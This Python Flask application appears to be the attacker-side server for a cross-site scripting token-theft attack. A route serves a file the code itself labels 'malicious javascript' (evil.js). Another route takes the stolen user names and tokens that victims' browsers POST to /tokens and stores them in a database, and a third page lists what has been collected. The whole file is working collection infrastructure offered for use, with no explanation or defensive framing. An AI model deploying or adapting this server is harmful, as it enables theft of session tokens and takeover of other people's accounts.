from flask import Flask, send_file, make_response, request, render_template
from database import Database as database_obj
import argparse

app = Flask(__name__)

# Triggered by POST request, this will commit users and tokens to DB
# Note the URL is "/tokens".
@app.route('/tokens', methods=['POST'])
def tokensjs():
    f = request.form
    token = f['token']
    user = f['user']
    if user == 'undefined':
        print("User is undefined - Something MAY have failed.")
        print("Will not write to database if user is undefined.")
        return make_response(
        'Success',
        200
    )
    if user != 'undefined':
        print(user)
        db_obj.insert_data(conn, user, token)
        return make_response(
            'Success',
            200
    )

# Triggered by a GET request - this will send malicious javascript file
@app.route('/evil.js', methods=(['GET']))
def eviljs():
    print("Sending XSS JS file")
    return send_file('./evil.js', download_name='evil.js')

@app.route('/results', methods=(["GET"]))
def home():
    results = db_obj.get_table(conn)
    return render_template('index.html',
    results = results
    )

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--new', help='Make new Database', action='store_true')
    parser.add_argument('--dbname', help='Name for Database')
    parser.add_argument('--existing', help='Use an existing database', action='store_true')
    args = parser.parse_args()

    if (args.new):
        try:
            if args.dbname is None:
                database = r"user_data_store.db"
            else:
                db_name = args.dbname
                database = r"{}".format(db_name)
            db_obj = database_obj()
            conn = db_obj.define_connection(database) 
            db_obj.create_db(conn)
        except:
            print("Error. Check the DB name and/or review code.")
    if (args.existing):
        if args.dbname is None:
            print("Please specify db name with '--dbname'.  Format is 'name_of_db_file.db")
        else:
            try:
                db_name = args.dbname
                database = r"{}".format(db_name)
                db_obj = database_obj()
                conn = db_obj.define_connection(database)
            except:
                print("Error accessing Database.  Check name.")
    
    
    
    app.run(host='127.0.0.1', port=8080)